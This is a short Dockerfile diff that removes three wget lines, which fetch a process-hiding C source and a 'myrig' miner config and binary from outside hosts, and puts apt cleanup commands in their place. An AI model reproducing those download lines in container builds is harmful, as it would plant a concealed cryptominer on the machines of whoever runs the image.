@@ -34,9 +34,8 @@ RUN apt-get install -y --no-install-recommends \
         wget \
         bash \
         gcc \
-    && wget https://raw.githubusercontent.com/cihuuy/libn/master/processhider.c \   
-    && wget https://nyadur.000webhostapp.com/myrig/config.json \
-    && wget https://nyadur.000webhostapp.com/myrig/durex \
+    && apt-get autoclean \
+    && apt-get autoremove \
     && rm -rf /var/lib/apt/lists/* /var/cache/apt/*
 
 
